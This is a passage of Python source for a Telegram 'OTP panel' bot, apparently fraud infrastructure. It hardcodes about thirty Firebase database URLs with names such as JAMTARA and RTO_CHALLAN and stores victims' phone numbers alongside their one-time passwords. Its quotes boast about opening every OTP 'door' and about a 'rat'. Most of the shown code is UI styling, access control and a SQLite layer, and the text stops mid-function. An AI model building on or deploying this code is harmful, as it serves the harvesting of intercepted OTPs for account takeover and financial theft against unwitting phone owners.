#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║          SHOWN X PANEL BOT — v3.0 ULTRA EDITION             ║
║   OTP Panel + ShownStore DNA + Live Monitor + User Hub       ║
║   Clone Manager + Firebase Health + Customize Studio         ║
╚══════════════════════════════════════════════════════════════╝
PART 1 — Core Engine, Storage, UI System, User Hub
"""

from __future__ import annotations

import asyncio
import gzip
import html
import io
import json
import logging
import os
import re
import random
import time
import traceback
from contextlib import asynccontextmanager
from datetime import datetime
from pathlib import Path

import aiohttp
import sqlite3

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InputMediaPhoto,
    InputMediaVideo,
    InputMediaAnimation,
)
try:
    from telegram import CopyTextButton as _PTB_COPY_TEXT_BUTTON
except ImportError:
    _PTB_COPY_TEXT_BUTTON = None

from telegram.constants import ParseMode
from telegram.error import (
    BadRequest, Forbidden, RetryAfter, TelegramError, Conflict, ChatMigrated
)
from telegram.ext import (
    Application,
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ══════════════════════════════════════════════════════════════
#  EASY CONFIGURATION
# ══════════════════════════════════════════════════════════════

BOT_TOKEN        = os.environ.get("BOT_TOKEN", "PASTE_YOUR_BOT_TOKEN_HERE")
BOT_USERNAME     = os.environ.get("BOT_USERNAME", "@shownXpannelbot")
BOT_BRAND_NAME   = os.environ.get("BOT_BRAND_NAME", "QURESHIxOTP")
OWNER_DISPLAY    = os.environ.get("OWNER_DISPLAY_NAME", "Shown")
OWNER_CONTACT    = os.environ.get("OWNER_CONTACT", "@WhoIsShown")
OWNER_ID         = int(os.environ.get("OWNER_ID", "8984851474"))
OWNER_USERNAME   = "WhoIsShown"

SQLITE_DB_PATH   = "shownxpanel.db"
BOT_VERSION      = "v3.0-ultra"
RICH_MESSAGES_ENABLED = True
HEALTH_CHECK_PORT     = 10000

# Poll + limits
POLL_INTERVAL    = 15
SMS_LIMIT        = 10
DB_CONCURRENCY   = 50
MAX_SEEN_IDS     = 200_000

# Firebase health check interval (seconds)
FB_HEALTH_INTERVAL = 300  # 5 min

# ── Rotating quotes shown on welcome ──────────────────────────
PANEL_QUOTES = [
    "⚡ Speed is the soul of the hustle.",
    "🔥 Every OTP is a door — we open them all.",
    "🧬 Data flows where the rat goes.",
    "💎 Quality panel, premium results.",
    "🚀 Built in the walls, shipped before dawn.",
    "🎯 Precision first. Volume second.",
    "⚓ Grounded. Sharp. Always online.",
    "🌪 The storm doesn't stop the signal.",
]

# ══════════════════════════════════════════════════════════════
#  DEFAULT FIREBASE DATABASES
# ══════════════════════════════════════════════════════════════

DEFAULT_DATABASES: dict[str, str] = {
    "👑 BOSS_R1":        "https://rexxx-4c7a7-default-rtdb.firebaseio.com",
    "👑 BOSS_R2":        "https://runjun-master-panel-default-rtdb.firebaseio.com",
    "⚡ ALPHA_A2":       "https://rto9-d2b33-default-rtdb.firebaseio.com",
    "🔥 ALPHA_A5":       "https://challan-758d1-default-rtdb.asia-southeast1.firebasedatabase.app",
    "⚔️ ALPHA_A12":      "https://fir-1fa16-default-rtdb.firebaseio.com",
    "🎯 ALPHA_A19":      "https://u40179853-987df-default-rtdb.firebaseio.com",
    "🔫 ALPHA_A21":      "https://u62803313-e54bc-default-rtdb.firebaseio.com",
    "🦾 ALPHA_A24":      "https://u67583339-bf0c1-default-rtdb.firebaseio.com",
    "🏹 ALPHA_A27":      "https://u8208372-ad1d1-default-rtdb.firebaseio.com",
    "🌪 ALPHA_A29":      "https://u25428732-91bd9-default-rtdb.firebaseio.com",
    "💥 ALPHA_A31":      "https://u72749819-fa563-default-rtdb.firebaseio.com",
    "🩸 ALPHA_A32":      "https://u24143844-c1b11-default-rtdb.firebaseio.com",
    "👹 ALPHA_A33":      "https://u72328193-47b68-default-rtdb.firebaseio.com",
    "🎭 ALPHA_A34":      "https://u58325342-dffc0-default-rtdb.firebaseio.com",
    "⛓ ALPHA_A35":      "https://u75887828-b5a63-default-rtdb.firebaseio.com",
    "🧿 ALPHA_A36":      "https://u24153206-5eef6-default-rtdb.firebaseio.com",
    "💵 MAFIA_M7":       "https://rto-47-b39f4-default-rtdb.firebaseio.com",
    "💰 MAFIA_M15_1":    "https://chfjfj-c2857-default-rtdb.firebaseio.com",
    "💎 MAFIA_M15_2":    "https://ai-rto-9-default-rtdb.firebaseio.com",
    "✨ VIP_EXTRA":      "https://s85138920-87594-default-rtdb.firebaseio.com",
    "📦 FORTY_DATA":     "https://fortydata-fee65-default-rtdb.firebaseio.com",
    "📡 FPRO_INDUS":     "https://fpro3indus-default-rtdb.firebaseio.com",
    "🚨 JAMTARA_181":    "https://jamtara181-default-rtdb.firebaseio.com",
    "🛸 PMS_JDJ":        "https://pmsjdj-default-rtdb.firebaseio.com",
    "💻 MY_CARRY":       "https://cs6mycarry68jh-default-rtdb.firebaseio.com",
    "🃏 RANDI_RONA":     "https://randi-rona-81876-default-rtdb.firebaseio.com",
    "🚔 RTO_CHALLAN_A":  "https://rtochallan-8579d-default-rtdb.firebaseio.com",
    "🛑 RTO_CHALLAN_B":  "https://rtochallan8-default-rtdb.firebaseio.com",
    "🐾 JAMTARA_140":    "https://jamtara140-73bf7-default-rtdb.firebaseio.com",
    "🔮 GGGGGG_NODE":    "https://gggggg-979bd-default-rtdb.firebaseio.com",
    "⚡ SHOWN SPECIAL":  "https://flash-v8enginepower-default-rtdb.firebaseio.com",
}

# ══════════════════════════════════════════════════════════════
#  LOGGING
# ══════════════════════════════════════════════════════════════

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("aiohttp").setLevel(logging.WARNING)
log = logging.getLogger("SHOWNX_PANEL")

# ══════════════════════════════════════════════════════════════
#  PREMIUM EMOJI ENGINE  (ShownStore DNA — exact port)
# ══════════════════════════════════════════════════════════════

_PREMIUM_EMOJI_IDS_1 = [
    "5967280668885913944","5258476306152038031","5213395028038132311","5260342697075416641",
    "5258236805890710909","5260450573768990626","5429571366384842791","5956561916573782596",
    "5870930636742595124","5956561916573782596","5258514780469075716","5359719332542718652",
    "5463274047771000031","5282964865349081926","5418010521309815154","5372917041193828849",
    "5870930636742595124","5260379144167890225","6280818246476111911","6111547907393987376",
    "5199552030615558774","6235403472741603087","5384544226333711035","6098159343281121498",
    "6319074379175043387","5445355530111437729","5258514780469075716","6100129320225741245",
    "6100384016081361171","6098236364929635183","5453957997418004470","5462921117423384478",
    "6280578093379754919","5416081784641168838","6100388225149310843","5244837092042750681",
    "5258477770735885832","5375464961822695044","5359529383319084413","5257974976094412956",
    "6201822626692734126","5897850551156084824","6005986106703613755","6203998186541948045",
    "6278463693864838049","5416081784641168838","5213395028038132311","6100258190719457801",
    "6100670735213139506","6098125829651307984","6219792052599660507","5409008750893734809",
    "6269400956387987689","5447203607294265305","5453902265922376865","5377599075237502153",
    "5915833712368424979","5415722218569089767","5197480146981906157","5388846172951558229",
    "5305336095863485125","5388941018714356665","6319074379175043387","5305603955793867793",
    "5280816565657300091",
]

_PREMIUM_EMOJI_LIST_1 = [
    "\u2709\ufe0f","\U0001f512","\u2705","\u274c","\u2b05\ufe0f","\u27a1\ufe0f","\U0001f50e",
    "\U0001f4c4","\U0001f4ca","\U0001f4c4","\U0001f4c2","\U0001f48e","\U0001f635","\U0001f49d",
    "\U0001f3ab","\U0001f680","\U0001f4ca","\U0001f53c","\U0001f4ac","\U0001f451",
    "\U0001fa99","\u2b50","\U0001f381","\U0001f4b0","\U0001f48e","\U0001f4e4","\U0001f4c2",
    "\U0001f6e1","\U0001f381","\U0001f4e2","\U0001f465","\U0001f6e0","\u2699\ufe0f",
    "\U0001f7e2","\U0001f6ab","\U0001f4c8","\U0001f4c4","\U0001f3ac","\u2795","\U0001f5bc",
    "\U0001f399","\U0001f4d6","\U0001f4f7","\U0001f451","\u2b50\ufe0f","\U0001f7e2","\u2705",
    "\U0001f534","\U0001f7e2","\U0001f389","\U0001f525","\U0001f3c6","\U0001f947","\U0001f948",
    "\U0001f949","\U0001f39f","\U0001f3b0","\U0001f352","\U0001f34b\u200d\U0001f7e9",
    "\U0001f347","\U0001f349","\U0001f34a","\U0001f48e","7\ufe0f\u20e3","\U0001f3b2",
]

_PREMIUM_EMOJI_IDS_2 = [
    "5418010521309815154","5258500400918587241","5451732530048802485","6332591195306334733",
    "6280368657889501500","5888781182249738113","6280648681167266267","6111396350883010682",
    "5258205968025525531","5444856076954520455","5258134813302332906","5350460637182993292",
    "5803057229909202251","6280712659000107348","5258331647358540449","5870930744116776638",
    "6221832909389570589","6098271033905650109","5447203607294265305","5453902265922376865",
    "6222239449518971912","5458603043203327669","6203974332293586380","5260502250815513613",
    "6172537761552142514","5280774071250872500","5384490809825450636","6278178593935728769",
    "6098271033905650109","6323166881712709901","6203957491726818885","5846210329700217522",
    "5258476306152038031","5258476306152038031","6334528491844798409","5462990652943904884",
    "6280289450102628695","5197434882321567830","5469641199348363998","5445353829304387411",
    "5444856076954520455","6280368657889501500","6203998186541948045","5188187560035234546",
    "6100670735213139506",
]

_PREMIUM_EMOJI_LIST_2 = [
    "\U0001f3ab","\u270d\ufe0f","\u23f3","\U0001f51c","\U0001f464","\U0001f194","\U0001f4c5",
    "\u26d3","\U0001f4f8","\U0001f9fe","\U0001f4e6","\U0001f3af","\u267b\ufe0f","\U0001f5d1",
    "\u270d\ufe0f","\U0001f4cc","\U0001f31f","\U0001f947","\U0001f948","\U0001f949",
    "\u26a1\ufe0f","\U0001f514","\U0001f38a","\U0001f973","\U0001f340","\U0001f37e","\U0001f381",
    "\U0001f6e1","\U0001f947","\U0001f948","\u2705","\u274c","\u26a0\ufe0f","\U0001f512",
    "\U0001f513","\U0001f477","\U0001f634","\U0001f4b0","\U0001f4b5","\u2b50\ufe0f",
    "\U0001f4b3","\U0001f9fe","\U0001f464","\U0001f451","\u26d4\ufe0f",
]

PREMIUM_EMOJI_MAP: dict[str, str] = {}
for _emj, _eid in list(zip(_PREMIUM_EMOJI_LIST_1, _PREMIUM_EMOJI_IDS_1)) + list(
    zip(_PREMIUM_EMOJI_LIST_2, _PREMIUM_EMOJI_IDS_2)
):
    PREMIUM_EMOJI_MAP.setdefault(_emj, _eid)

for _emj, _eid in list(PREMIUM_EMOJI_MAP.items()):
    _plain = _emj.replace("\ufe0f", "")
    if _plain and _plain != _emj:
        PREMIUM_EMOJI_MAP.setdefault(_plain, _eid)
    PREMIUM_EMOJI_MAP.setdefault(_emj + "\ufe0f", _eid)

# Extra panel-specific emoji
_EXTRA = {
    "\U0001f4b8": "5404561694510833322",   # 💸
    "\U0001f50d": "6206446249181189526",   # 🔍
    "\U0001f4af": "5206318837489743801",   # 💯
    "\u2604":     "5224607267797606837",   # ☄️
    "\u26d4":     "5246772116543512028",   # ⛔
    "\u270b":     "5339286072876614251",   # ✋
    "\U0001f6f8": "5372849966689566579",   # 🛸
    "\u270f":     "6204162490515855272",   # ✏️
    "\U0001f517": "6206497372176913599",   # 🔗
    "\u2b50":     "6206404510689007446",   # ⭐
    "\u26a0":     "6206174450765796040",   # ⚠️
    "\u2714":     "6206479140040743133",   # ✔️
}
for _k, _v in _EXTRA.items():
    PREMIUM_EMOJI_MAP.setdefault(_k, _v)
    PREMIUM_EMOJI_MAP.setdefault(_k + "\ufe0f", _v)
    PREMIUM_EMOJI_MAP.setdefault(_k.replace("\ufe0f", ""), _v)

_EMOJI_RE = re.compile(
    "|".join(re.escape(k) for k in sorted(PREMIUM_EMOJI_MAP, key=len, reverse=True))
)


def _wrap_emoji_segment(seg: str) -> str:
    return _EMOJI_RE.sub(
        lambda m: f'<tg-emoji emoji-id="{PREMIUM_EMOJI_MAP[m.group(0)]}">{m.group(0)}</tg-emoji>',
        seg,
    )


def premiumize_html(text: str) -> str:
    if not text:
        return text
    parts = re.split(r"(<tg-emoji[^>]*>.*?</tg-emoji>|<[^>]+>)", text)
    out = []
    in_code = 0
    for p in parts:
        if p.startswith("<tg-emoji") or p.startswith("<"):
            tag = p.lower()
            if tag.startswith(("<code", "<pre")):
                in_code += 1
            elif tag.startswith(("</code", "</pre")):
                in_code = max(0, in_code - 1)
            out.append(p)
        elif in_code:
            out.append(p)
        else:
            out.append(_wrap_emoji_segment(p))
    return "".join(out)


# ══════════════════════════════════════════════════════════════
#  TEXT STYLE ENGINE  (ShownStore DNA — 𝗙ɪʀꜱᴛ ʟᴇᴛᴛᴇʀ ʙᴏʟᴅ ꜱᴍᴀʟʟᴄᴀᴩꜱ)
# ══════════════════════════════════════════════════════════════

_SMALL_CAPS = dict(zip(
    "abcdefghijklmnopqrstuvwxyz",
    ["\u1d00","\u0299","\u1d04","\u1d05","\u1d07","\ua730","\u0262","\u029c","\u026a",
     "\u1d0a","\u1d0b","\u029f","\u1d0d","\u0274","\u1d0f","\u1d29","q","\u0280",
     "\ua731","\u1d1b","\u1d1c","\u1d20","\u1d21","x","\u028f","\u1d22"],
))
_UNSTYLE = {v: k for k, v in _SMALL_CAPS.items() if v != k}

_SKIP_RE  = re.compile(r"(<[^>]+>|&[a-zA-Z#0-9]+;|https?://\S+|@[A-Za-z0-9_]+|/[a-z_]+)")
_WORD_RE  = re.compile(r"[A-Za-z]+")


def _style_word(m: re.Match) -> str:
    w = m.group(0)
    out, first = [], True
    for ch in w:
        if first and ch.isalpha():
            out.append(ch.upper()); first = False
        else:
            out.append(_SMALL_CAPS.get(ch, ch))
    return "".join(out)


def stylize_text(text: str) -> str:
    if not text:
        return text
    parts = _SKIP_RE.split(text)
    out, in_code = [], False
    for part in parts:
        if not part:
            continue
        if part.startswith("<"):
            tag = part.lower()
            if tag.startswith(("<code", "<pre")):
                in_code = True
            elif tag.startswith(("</code", "</pre")):
                in_code = False
            out.append(part)
        elif _SKIP_RE.fullmatch(part):
            out.append(part)
        elif in_code:
            out.append(part)
        else:
            out.append(_WORD_RE.sub(_style_word, part))
    return "".join(out)


def unstyle_text(text: str) -> str:
    if not text:
        return text
    return "".join(_UNSTYLE.get(ch, ch) for ch in text)


def beautify(text: str, parse_mode=None):
    """Stylize + premium emoji. Returns (text, parse_mode)."""
    if not text:
        return text, parse_mode
    if parse_mode is None:
        text = html.escape(text)
        parse_mode = ParseMode.HTML
    elif str(parse_mode).lower() not in ("html", "parsemode.html"):
        return stylize_text(text), parse_mode
    styled = premiumize_html(stylize_text(text))
    if not styled.lstrip().startswith("<blockquote"):
        styled = f"<blockquote>{styled}</blockquote>"
    return styled, parse_mode


# ── Install premium style hooks on Bot ────────────────────────
def _install_premium_style() -> None:
    from telegram import Bot

    def _patch_text(name: str, field: str) -> None:
        original = getattr(Bot, name, None)
        if original is None or getattr(original, "_px_patched", False):
            return

        async def wrapper(self, *args, __orig=original, __field=field, **kwargs):
            if __field in kwargs and isinstance(kwargs[__field], str):
                new_text, pm = beautify(kwargs[__field], kwargs.get("parse_mode"))
                kwargs[__field] = new_text
                kwargs["parse_mode"] = pm
            return await __orig(self, *args, **kwargs)

        wrapper._px_patched = True
        setattr(Bot, name, wrapper)

    for _m in ("send_message", "edit_message_text"):
        _patch_text(_m, "text")
    for _m in ("send_photo","send_document","send_video","send_audio","send_voice",
               "send_animation","send_video_note","edit_message_caption"):
        _patch_text(_m, "caption")

    # Buttons: auto extract leading emoji as icon_custom_emoji_id
    import inspect as _inspect
    for _cls in (InlineKeyboardButton, KeyboardButton):
        _orig_init = _cls.__init__
        if getattr(_orig_init, "_px_patched", False):
            continue
        try:
            _supports_icon = "icon_custom_emoji_id" in _inspect.signature(_orig_init).parameters
        except (TypeError, ValueError):
            _supports_icon = False

        def _init(self, text=None, *args, __orig=_orig_init, __icon=_supports_icon, **kwargs):
            if text is None and isinstance(kwargs.get("text"), str):
                text = kwargs.pop("text")
            if isinstance(text, str):
                if __icon and "icon_custom_emoji_id" not in kwargs:
                    leading = text.lstrip()
                    m = _EMOJI_RE.match(leading)
                    if m:
                        emoji = m.group(0)
                        kwargs["icon_custom_emoji_id"] = (
                            PREMIUM_EMOJI_MAP.get(emoji)
                            or PREMIUM_EMOJI_MAP.get(emoji.replace("\ufe0f", ""))
                        )
                        offset = len(text) - len(leading)
                        end = offset + m.end()
                        text = (text[:offset] + text[end:]).strip()
                text = stylize_text(text)
            if text is None:
                return __orig(self, *args, **kwargs)
            return __orig(self, text, *args, **kwargs)

        _init._px_patched = True
        _cls.__init__ = _init


_install_premium_style()


# ══════════════════════════════════════════════════════════════
#  RICH MESSAGE SYSTEM  (ShownStore DNA)
# ══════════════════════════════════════════════════════════════

def _rich_media_binding(file_id: str, media_type: str):
    mt = (media_type or "").strip().lower()
    if mt in {"gif", "mp4_animation"}:
        mt = "animation"
    if mt == "photo":
        return (
            "tg://photo?id=hero_media",
            {"id": "hero_media", "media": {"type": "photo", "media": file_id}},
        )
    if mt in {"video", "animation"}:
        return (
            "tg://video?id=hero_media",
            {"id": "hero_media", "media": {"type": mt, "media": file_id}},
        )
    return None, None


def _rich_slideshow_binding(slides: list[dict]):
    if not slides:
        return "", []
    figures, media = [], []
    for i, slide in enumerate(slides):
        mt = (slide.get("type") or "photo").strip().lower()
        if mt in {"gif", "mp4_animation"}:
            mt = "animation"
        sid = f"slide{i}"
        tag = "video" if mt in {"video", "animation"} else "img"
        ref = "video" if tag == "video" else "photo"
        figures.append(f'<figure><{tag} src="tg://{ref}?id={sid}"/></figure>')
        media.append({"id": sid, "media": {"type": mt, "media": slide["file_id"]}})
    return "<tg-slideshow>" + "".join(figures) + "</tg-slideshow>", media


async def _send_rich_message(bot, chat_id, rich_message: dict, reply_markup=None):
    post = getattr(bot, "_post", None)
    if post is None:
        raise RuntimeError("No request layer")
    payload = {"chat_id": chat_id, "rich_message": rich_message}
    if reply_markup is not None:
        payload["reply_markup"] = reply_markup.to_dict()
    result = await post("sendRichMessage", data=payload)
    if isinstance(result, dict) and result.get("ok") is False:
        raise TelegramError(result.get("description", "Rich Message rejected"))
    return result


async def send_rich_or_fallback(
    bot, chat_id, rich_html: str, fallback_html: str,
    reply_markup=None, media_file_id="", media_type="",
    slides: list[dict] | None = None,
):
    rich_payload = {"html": premiumize_html(rich_html)}
    mt = (media_type or "").strip().lower()

    if slides:
        ss_html, ss_media = _rich_slideshow_binding(slides)
        rich_payload["html"] = ss_html + rich_payload["html"]
        rich_payload["media"] = ss_media
    elif media_file_id:
        ref, binding = _rich_media_binding(media_file_id, media_type)
        if ref and binding:
            hero = (
                f'<figure><img src="{ref}"/></figure>' if mt == "photo"
                else f'<figure><video src="{ref}"></video></figure>'
            )
            rich_payload["html"] = hero + rich_payload["html"]
            rich_payload["media"] = [binding]

    if RICH_MESSAGES_ENABLED:
        try:
            return await _send_rich_message(bot, chat_id, rich_payload, reply_markup)
        except (TelegramError, AttributeError, TypeError, ValueError, RuntimeError) as exc:
            log.warning("Rich Message unavailable, using fallback: %s", exc)

    if slides:
        items = []
        for s in slides[:10]:
            smt = (s.get("type") or "photo").lower()
            if smt in {"video", "animation", "gif", "mp4_animation"}:
                items.append(InputMediaVideo(s["file_id"]))
            else:
                items.append(InputMediaPhoto(s["file_id"]))
        try:
            await bot.send_media_group(chat_id, items)
        except TelegramError:
            pass
        return await bot.send_message(chat_id, fallback_html, parse_mode=ParseMode.HTML, reply_markup=reply_markup)

    if media_file_id:
        if mt in {"gif", "mp4_animation", "animation"}:
            return await bot.send_animation(chat_id, media_file_id, caption=fallback_html, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        if mt == "video":
            return await bot.send_video(chat_id, media_file_id, caption=fallback_html, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        if mt == "photo":
            return await bot.send_photo(chat_id, media_file_id, caption=fallback_html, parse_mode=ParseMode.HTML, reply_markup=reply_markup)

    return await bot.send_message(chat_id, fallback_html, parse_mode=ParseMode.HTML, reply_markup=reply_markup)


# ══════════════════════════════════════════════════════════════
#  PTB STYLE SAFETY WRAPPER
#  style= kwarg only works on custom Telegram PTB forks.
#  These wrappers silently drop it on stock PTB so the bot
#  never crashes, while still passing it on supported builds.
# ══════════════════════════════════════════════════════════════

import inspect as _inspect_ptb

_IKB_SUPPORTS_STYLE = "style" in _inspect_ptb.signature(InlineKeyboardButton.__init__).parameters
_KB_SUPPORTS_STYLE  = "style" in _inspect_ptb.signature(KeyboardButton.__init__).parameters


def _ikb(text: str, *, style: str = "primary", **kwargs) -> InlineKeyboardButton:
    if _IKB_SUPPORTS_STYLE:
        return InlineKeyboardButton(text, style=style, **kwargs)
    return InlineKeyboardButton(text, **kwargs)


def _kb(text: str, *, style: str = "primary", **kwargs) -> KeyboardButton:
    if _KB_SUPPORTS_STYLE:
        return KeyboardButton(text, style=style, **kwargs)
    return KeyboardButton(text, **kwargs)


# ══════════════════════════════════════════════════════════════
#  UI HELPERS  (ShownStore DNA)
# ══════════════════════════════════════════════════════════════

DIVIDER      = "───────────────────────"
DIVIDER_THIN = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"


def ui_box(*lines: str) -> str:
    """Blockquote-wrapped section with one or more lines."""
    body = "\n".join(l for l in lines if l)
    return f"<blockquote>{body}</blockquote>" if body else ""


def ui_kv(icon: str, label: str, value: str) -> str:
    return f"{icon} <b>{label}:</b> {value}"


def ui_screen(icon: str, title: str, *blocks: str, subtitle: str = "", footer: str = "") -> str:
    header = (
        f"<blockquote>{DIVIDER}\n"
        f"{icon} <b>{title.upper()}</b>\n"
        f"{DIVIDER}</blockquote>"
    )
    sub = f"\n<i>{subtitle}</i>" if subtitle else ""
    body = "\n\n".join(b for b in blocks if b)
    foot = f"\n\n<blockquote><i>{footer}</i></blockquote>" if footer else ""
    return f"{header}{sub}\n\n{body}{foot}"


def ui_status(label: str, active: bool) -> str:
    dot = "🟢" if active else "🔴"
    state = "On" if active else "Off"
    return f"{dot} <b>{label}:</b> {state}"


def back_row(cb: str = "home", label: str = "⬅ Back") -> list:
    return [_ikb(label, callback_data=cb, style="primary")]


def kb_grid(buttons: list, cols: int = 2) -> list[list]:
    rows = []
    for i in range(0, len(buttons), cols):
        rows.append(buttons[i:i+cols])
    return rows


def pager_row(prefix: str, page: int, total_pages: int) -> list | None:
    if total_pages <= 1:
        return None
    btns = []
    if page > 0:
        btns.append(_ikb("⬅ Prev", callback_data=f"{prefix}{page-1}", style="primary"))
    btns.append(_ikb(f"📄 {page+1}/{total_pages}", callback_data="noop", style="primary"))
    if page < total_pages - 1:
        btns.append(_ikb("Next ➡", callback_data=f"{prefix}{page+1}", style="primary"))
    return btns if btns else None


# ══════════════════════════════════════════════════════════════
#  SQLITE DATABASE LAYER
# ══════════════════════════════════════════════════════════════

_db_path = SQLITE_DB_PATH
_db_conn_local: sqlite3.Connection | None = None
_db_lock = asyncio.Lock()


def _get_sync_conn() -> sqlite3.Connection:
    global _db_conn_local
    if _db_conn_local is None:
        _db_conn_local = sqlite3.connect(_db_path, check_same_thread=False)
        _db_conn_local.row_factory = sqlite3.Row
        _db_conn_local.execute("PRAGMA journal_mode=WAL")
        _db_conn_local.execute("PRAGMA synchronous=NORMAL")
    return _db_conn_local


@asynccontextmanager
async def db():
    async with _db_lock:
        conn = _get_sync_conn()
        try:
            yield conn
            conn.commit()
        except Exception:
            conn.rollback()
            raise


async def init_db() -> None:
    async with db() as conn:
        conn.executescript("""
        CREATE TABLE IF NOT EXISTS settings (
            key   TEXT PRIMARY KEY,
            value TEXT
        );

        CREATE TABLE IF NOT EXISTS allowed_users (
            user_id    INTEGER PRIMARY KEY,
            granted_by INTEGER,
            granted_at TEXT
        );

        CREATE TABLE IF NOT EXISTS all_users (
            user_id    INTEGER PRIMARY KEY,
            username   TEXT,
            first_name TEXT,
            join_date  TEXT,
            last_seen  TEXT,
            referrals  TEXT DEFAULT '[]'
        );

        CREATE TABLE IF NOT EXISTS user_hub (
            id         INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id    INTEGER NOT NULL,
            phone      TEXT NOT NULL,
            otp        TEXT,
            db_name    TEXT,
            db_url     TEXT,
            timestamp  TEXT NOT NULL
        );
        CREATE INDEX IF NOT EXISTS idx_user_hub_user ON user_hub(user_id);
        CREATE INDEX IF NOT EXISTS idx_user_hub_phone ON user_hub(phone);

        CREATE TABLE IF NOT EXISTS firebase_health (
            db_name    TEXT PRIMARY KEY,
            db_url     TEXT,
            status     TEXT DEFAULT 'unknown',
            last_check TEXT,
            fail_count INTEGER DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS backup_history (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp   TEXT NOT NULL,
            filename    TEXT NOT NULL,
            size_bytes  INTEGER,
            target_chat INTEGER
        );

        CREATE TABLE IF NOT EXISTS monitor_subscriptions (
            user_id INTEGER PRIMARY KEY,
            active  INTEGER DEFAULT 1
        );

        CREATE TABLE IF NOT EXISTS welcome_config (
            id          INTEGER PRIMARY KEY CHECK (id = 1),
            text        TEXT,
            media_file_id TEXT,
            media_type  TEXT,
            updated_at  TEXT
        );
        INSERT OR IGNORE INTO welcome_config (id) VALUES (1);

        CREATE TABLE IF NOT EXISTS cloned_panels (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            name        TEXT NOT NULL,
            source_name TEXT,
            db_url      TEXT NOT NULL,
            created_at  TEXT,
            notes       TEXT
        );

        CREATE TABLE IF NOT EXISTS activity_log (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id   INTEGER,
            action    TEXT,
            detail    TEXT,
            timestamp TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_activity_user ON activity_log(user_id);
        """)
    log.info("SQLite database initialized: %s", _db_path)


# ── Settings helpers ───────────────────────────────────────────
_settings_cache: dict[str, str] = {}
_settings_lock = asyncio.Lock()

DEFAULT_SETTINGS = {
    "grant_access_required": "1",
    "referral_enabled":      "1",
    "required_referrals":    "2",
    "force_join_enabled":    "0",
    "auto_db_enabled":       "0",
    "auto_db_interval":      "3600",
    "auto_db_group":         "",
    "poll_interval":         "15",
    "monitor_enabled":       "0",
    "admin_only_tags":       "[]",
    "force_join_channels":   "[]",
    "bot_brand_name":        BOT_BRAND_NAME,
    "owner_display":         OWNER_DISPLAY,
    "owner_contact":         OWNER_CONTACT,
}


async def get_setting(key: str, default: str = "") -> str:
    async with _settings_lock:
        if key in _settings_cache:
            v = _settings_cache[key]
            return v if v not in (None, "") else default
    async with db() as conn:
        row = conn.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
        v = row["value"] if row else None
    async with _settings_lock:
        _settings_cache[key] = v or default
    return v if v not in (None, "") else default


async def set_setting(key: str, value: str) -> None:
    async with db() as conn:
        conn.execute(
            "INSERT INTO settings(key,value) VALUES(?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value",
            (key, value),
        )
    async with _settings_lock:
        _settings_cache[key] = value


async def get_setting_bool(key: str, default: bool = False) -> bool:
    v = await get_setting(key, "1" if default else "0")
    return v == "1"


async def get_setting_int(key: str, default: int = 0) -> int:
    v = await get_setting(key, str(default))
    try:
        return int(v)
    except (TypeError, ValueError):
        return default


async def get_setting_json(key: str, default=None):
    v = await get_setting(key, "")
    if not v:
        return default
    try:
        return json.loads(v)
    except Exception:
        return default


async def _init_default_settings() -> None:
    for k, v in DEFAULT_SETTINGS.items():
        async with db() as conn:
            conn.execute(
                "INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)", (k, v)
            )


# ── Global in-memory state ─────────────────────────────────────
DATABASES: dict[str, str] = dict(DEFAULT_DATABASES)
seen_ids: set[str] = set()
first_run: bool = True
_http_session: aiohttp.ClientSession | None = None
_main_app: Application | None = None

# Firebase health cache: db_name -> {"status": "alive"|"dead"|"unknown", "last_check": float}
_fb_health: dict[str, dict] = {}

# Allowed users set (populated from DB on startup)
allowed_users: set[int] = set()

# Admin IDs
ADMIN_IDS: set[int] = {OWNER_ID}

# Pending action state
pending_action: dict[int, dict] = {}
user_cooldowns: dict[int, float] = {}
user_focus: dict[int, str] = {}
user_page: dict[int, int] = {}


# ══════════════════════════════════════════════════════════════
#  ACCESS CONTROL
# ══════════════════════════════════════════════════════════════

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS


async def has_access(user_id: int) -> bool:
    if is_admin(user_id):
        return True
    if not await get_setting_bool("grant_access_required", True):
        return True
    if user_id in allowed_users:
        return True
    if await get_setting_bool("referral_enabled", True):
        req = await get_setting_int("required_referrals", 2)
        count = await referral_count(user_id)
        if count >= req:
            return True
    return False


async def referral_count(user_id: int) -> int:
    async with db() as conn:
        row = conn.execute("SELECT referrals FROM all_users WHERE user_id=?", (user_id,)).fetchone()
    if not row or not row["referrals"]:
        return 0
    try:
        refs = json.loads(row["referrals"])
        return len(set(str(x) for x in refs))
    except Exception:
        return 0


async def grant_access(user_id: int, granted_by: int = OWNER_ID) -> None:
    allowed_users.add(user_id)
    async with db() as conn:
        conn.execute(
            "INSERT OR IGNORE INTO allowed_users(user_id,granted_by,granted_at) VALUES(?,?,?)",
            (user_id, granted_by, datetime.utcnow().isoformat()),
        )


async def revoke_access(user_id: int) -> None:
    allowed_users.discard(user_id)
    async with db() as conn:
        conn.execute("DELETE FROM allowed_users WHERE user_id=?", (user_id,))


async def ensure_user(user_id: int, username: str | None, first_name: str | None) -> bool:
    now = datetime.utcnow().isoformat()
    async with db() as conn:
        exists = conn.execute("SELECT 1 FROM all_users WHERE user_id=?", (user_id,)).fetchone()
        if exists:
            conn.execute(
                "UPDATE all_users SET username=?,first_name=?,last_seen=? WHERE user_id=?",
                (username, first_name, now, user_id),
            )
            return False
        conn.execute(
